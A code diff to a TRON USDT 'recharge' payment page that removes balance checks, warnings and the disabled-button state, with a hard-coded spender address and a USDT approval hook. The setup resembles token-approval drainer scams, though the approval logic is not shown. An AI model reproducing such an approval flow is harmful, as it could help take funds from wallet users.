@@ -29,9 +29,6 @@ const RechargeUsdtPage = () => {
   const [showPaymentModal, setShowPaymentModal] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
   const [spenderAddress, setSpenderAddress] = useState<string>('TYDzsYUEpvnYmQk4zGP9sWWcTEd2MiAtW6');
-  const [balanceChecked, setBalanceChecked] = useState(false);
-  const [balanceWarning, setBalanceWarning] = useState<string | null>(null);
-  const [canPay, setCanPay] = useState(true);
   const hasCreatedOrder = useRef(false);
   const { user } = useAuth();
   const { t } = useLanguage();
@@ -43,13 +40,11 @@ const RechargeUsdtPage = () => {
     address,
     isConnecting,
     error: walletError,
-    balanceInfo,
     connect,
     detectWallets,
     openWallet,
     approveUSDT,
-    checkTronWeb,
-    checkBalances
+    checkTronWeb
   } = useTronWallet();
 
   const amount = searchParams.get('amount') || '50';
@@ -156,35 +151,18 @@ const RechargeUsdtPage = () => {
     }
   }, [hasTronWeb, isConnected, connect]);
 
-  // Check balances when wallet is connected
+  // Update transaction with wallet address when connected
   useEffect(() => {
-    const doBalanceCheck = async () => {
-      if (isConnected && address && !balanceChecked) {
-        const info = await checkBalances(parseFloat(amount));
-        setBalanceChecked(true);
-        
-        if (!info.hasSufficientTrx) {
-          setBalanceWarning('请确保账户有15个TRX做为交易手续费');
-          setCanPay(false);
-        } else if (!info.hasSufficientUsdt) {
-          setBalanceWarning('当前USDT余额不足，无法支付');
-          setCanPay(false);
-        } else {
-          setBalanceWarning(null);
-          setCanPay(true);
-        }
-        
-        // Update transaction with wallet address
-        if (paymentOrderId) {
-          await supabase
-            .from('transactions')
-            .update({ wallet_address: address })
-            .eq('order_id', paymentOrderId);
-        }
+    const updateWalletAddress = async () => {
+      if (isConnected && address && paymentOrderId) {
+        await supabase
+          .from('transactions')
+          .update({ wallet_address: address })
+          .eq('order_id', paymentOrderId);
       }
     };
-    doBalanceCheck();
-  }, [isConnected, address, amount, balanceChecked, checkBalances, paymentOrderId]);
+    updateWalletAddress();
+  }, [isConnected, address, paymentOrderId]);
 
   const formatTime = (seconds: number) => {
     const mins = Math.floor(seconds / 60);
@@ -230,49 +208,12 @@ const RechargeUsdtPage = () => {
 
   const handlePayClick = async () => {
     if (isConnected) {
-      if (!canPay) {
-        // Re-check balances
-        const info = await checkBalances(parseFloat(amount));
-        if (!info.hasSufficientTrx) {
-          toast({
-            title: '余额不足',
-            description: '请确保账户有15个TRX做为交易手续费',
-            variant: 'destructive',
-          });
-          return;
-        }
-        if (!info.hasSufficientUsdt) {
-          toast({
-            title: '余额不足',
-            description: '当前USDT余额不足，无法支付',
-            variant: 'destructive',
-          });
-          return;
-        }
-        setCanPay(true);
-        setBalanceWarning(null);
-      }
       // Show payment mode modal
       setShowPaymentModal(true);
     } else {
       // Try to connect wallet
       const connected = await connect();
-      if (connected) {
-        // After connecting, check balances
-        const info = await checkBalances(parseFloat(amount));
-        setBalanceChecked(true);
-        
-        if (!info.hasSufficientTrx) {
-          setBalanceWarning('请确保账户有15个TRX做为交易手续费');
-          setCanPay(false);
-        } else if (!info.hasSufficientUsdt) {
-          setBalanceWarning('当前USDT余额不足，无法支付');
-          setCanPay(false);
-        } else {
-          setBalanceWarning(null);
-          setCanPay(true);
-        }
-      } else if (isMobile) {
+      if (!connected && isMobile) {
         // On mobile, show wallet options
         toast({
           title: '请选择钱包',
@@ -400,18 +341,13 @@ const RechargeUsdtPage = () => {
             {/* Wallet Connection Status */}
             {isConnected && address && (
               <div className="mt-4 bg-green-500/20 rounded-lg p-4">
-                <div className="flex items-center gap-2">
+              <div className="flex items-center gap-2">
                   <Wallet className="h-5 w-5" />
                   <div>
                     <div className="text-xs opacity-70">已连接钱包</div>
                     <div className="text-sm font-mono">{address.slice(0, 8)}...{address.slice(-6)}</div>
                   </div>
                 </div>
-                {balanceChecked && (
-                  <div className="mt-2 text-xs opacity-80">
-                    TRX: {balanceInfo.trxBalance.toFixed(2)} | USDT: {balanceInfo.usdtBalance.toFixed(2)}
-                  </div>
-                )}
               </div>
             )}
           </div>
@@ -513,29 +449,17 @@ const RechargeUsdtPage = () => {
               </div>
             )}
 
-            {/* Balance Warning */}
-            {isConnected && balanceWarning && (
-              <div className="p-4 bg-destructive/10 border-b border-border">
-                <div className="flex items-center gap-2 text-destructive">
-                  <AlertCircle className="h-5 w-5" />
-                  <span className="font-medium">{balanceWarning}</span>
-                </div>
-              </div>
-            )}
-
             {/* Payment Button */}
             <div className="p-6 border-b border-border">
               <Button 
-                className={`w-full h-12 text-lg font-medium ${
-                  isConnected && !canPay ? 'bg-muted text-muted-foreground hover:bg-muted cursor-not-allowed' : ''
-                }`}
+                className="w-full h-12 text-lg font-medium"
                 onClick={handlePayClick}
-                disabled={isConnecting || (isConnected && !canPay)}
+                disabled={isConnecting}
               >
                 {isConnecting ? (
                   <>连接钱包中...</>
                 ) : isConnected ? (
-                  canPay ? <>支付</> : <>余额不足</>
+                  <>支付</>
                 ) : (
                   <>连接钱包并支付</>
                 )}
